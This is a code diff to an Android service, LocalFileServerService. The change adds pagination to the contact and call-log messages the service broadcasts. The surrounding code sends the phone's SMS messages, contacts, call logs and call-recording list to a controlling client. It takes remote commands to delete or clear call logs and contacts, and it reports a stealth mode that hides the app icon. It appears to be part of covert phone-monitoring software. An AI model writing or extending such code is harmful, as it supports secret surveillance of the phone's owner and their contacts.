@@ -539,13 +539,29 @@ class LocalFileServerService : Service() {
             broadcastMessage(JSONObject().put("type", "SMS_LIST").put("data", teleManager.getRecentSms()).toString())
         } catch (e: Exception) { e.printStackTrace() }
         try {
-            broadcastMessage(JSONObject().put("type", "CONTACTS_LIST").put("data", teleManager.getContacts()).toString())
+            val contactsPaged = teleManager.getContactsPaged(0, 150)
+            broadcastMessage(JSONObject().apply {
+                put("type", "CONTACTS_LIST")
+                put("data", contactsPaged.getJSONArray("data"))
+                put("offset", contactsPaged.getInt("offset"))
+                put("limit", contactsPaged.getInt("limit"))
+                put("total", contactsPaged.getInt("total"))
+                put("hasMore", contactsPaged.getBoolean("hasMore"))
+            }.toString())
         } catch (e: Exception) { e.printStackTrace() }
         try {
             broadcastMessage(JSONObject().put("type", "STORAGE_STATS").put("data", teleManager.getStorageStats()).toString())
         } catch (e: Exception) { e.printStackTrace() }
         try {
-            broadcastMessage(JSONObject().put("type", "CALL_LOGS_LIST").put("data", teleManager.getCallLogs()).toString())
+            val callLogsPaged = teleManager.getCallLogsPaged(0, 100)
+            broadcastMessage(JSONObject().apply {
+                put("type", "CALL_LOGS_LIST")
+                put("data", callLogsPaged.getJSONArray("data"))
+                put("offset", callLogsPaged.getInt("offset"))
+                put("limit", callLogsPaged.getInt("limit"))
+                put("total", callLogsPaged.getInt("total"))
+                put("hasMore", callLogsPaged.getBoolean("hasMore"))
+            }.toString())
             broadcastMessage(JSONObject().put("type", "STEALTH_MODE_STATUS").put("hideIcon", isStealthModeActive()).toString())
             broadcastCallRecordingsList()
         } catch (e: Exception) { e.printStackTrace() }
@@ -1461,9 +1477,16 @@ class LocalFileServerService : Service() {
 
 
             "FETCH_CALL_LOGS" -> {
+                val offset = json.optInt("offset", 0)
+                val limit = json.optInt("limit", 100)
+                val paged = teleManager.getCallLogsPaged(offset, limit)
                 broadcastMessage(JSONObject().apply {
                     put("type", "CALL_LOGS_LIST")
-                    put("data", teleManager.getCallLogs())
+                    put("data", paged.getJSONArray("data"))
+                    put("offset", paged.getInt("offset"))
+                    put("limit", paged.getInt("limit"))
+                    put("total", paged.getInt("total"))
+                    put("hasMore", paged.getBoolean("hasMore"))
                 }.toString())
             }
 
@@ -1477,9 +1500,16 @@ class LocalFileServerService : Service() {
 
 
             "FETCH_CONTACTS" -> {
+                val offset = json.optInt("offset", 0)
+                val limit = json.optInt("limit", 150)
+                val paged = teleManager.getContactsPaged(offset, limit)
                 broadcastMessage(JSONObject().apply {
                     put("type", "CONTACTS_LIST")
-                    put("data", teleManager.getContacts())
+                    put("data", paged.getJSONArray("data"))
+                    put("offset", paged.getInt("offset"))
+                    put("limit", paged.getInt("limit"))
+                    put("total", paged.getInt("total"))
+                    put("hasMore", paged.getBoolean("hasMore"))
                 }.toString())
             }
 
@@ -1488,9 +1518,14 @@ class LocalFileServerService : Service() {
                 val number = json.optString("number", "")
                 val date = if (json.has("date")) json.optLong("date", -1L) else -1L
                 teleManager.deleteCallLog(if (id > 0) id else null, number, if (date > 0) date else null)
+                val paged = teleManager.getCallLogsPaged(0, 100)
                 broadcastMessage(JSONObject().apply {
                     put("type", "CALL_LOGS_LIST")
-                    put("data", teleManager.getCallLogs())
+                    put("data", paged.getJSONArray("data"))
+                    put("offset", 0)
+                    put("limit", 100)
+                    put("total", paged.getInt("total"))
+                    put("hasMore", paged.getBoolean("hasMore"))
                 }.toString())
             }
 
@@ -1498,7 +1533,11 @@ class LocalFileServerService : Service() {
                 teleManager.clearCallLogs()
                 broadcastMessage(JSONObject().apply {
                     put("type", "CALL_LOGS_LIST")
-                    put("data", teleManager.getCallLogs())
+                    put("data", JSONArray())
+                    put("offset", 0)
+                    put("limit", 100)
+                    put("total", 0)
+                    put("hasMore", false)
                 }.toString())
             }
 
@@ -1509,9 +1548,14 @@ class LocalFileServerService : Service() {
                 if (name.isNotEmpty() && number.isNotEmpty()) {
                     teleManager.addContact(name, number, if (email.isNotEmpty()) email else null)
                 }
+                val paged = teleManager.getContactsPaged(0, 150)
                 broadcastMessage(JSONObject().apply {
                     put("type", "CONTACTS_LIST")
-                    put("data", teleManager.getContacts())
+                    put("data", paged.getJSONArray("data"))
+                    put("offset", 0)
+                    put("limit", 150)
+                    put("total", paged.getInt("total"))
+                    put("hasMore", paged.getBoolean("hasMore"))
                 }.toString())
             }
 
@@ -1519,9 +1563,14 @@ class LocalFileServerService : Service() {
                 val id = if (json.has("id")) json.optLong("id", -1L) else -1L
                 val number = json.optString("number", "")
                 teleManager.deleteContact(if (id > 0) id else null, number)
+                val paged = teleManager.getContactsPaged(0, 150)
                 broadcastMessage(JSONObject().apply {
                     put("type", "CONTACTS_LIST")
-                    put("data", teleManager.getContacts())
+                    put("data", paged.getJSONArray("data"))
+                    put("offset", 0)
+                    put("limit", 150)
+                    put("total", paged.getInt("total"))
+                    put("hasMore", paged.getBoolean("hasMore"))
                 }.toString())
             }
 
@@ -1917,5 +1966,3 @@ class LocalFileServerService : Service() {
         }
     }
 }
-
-
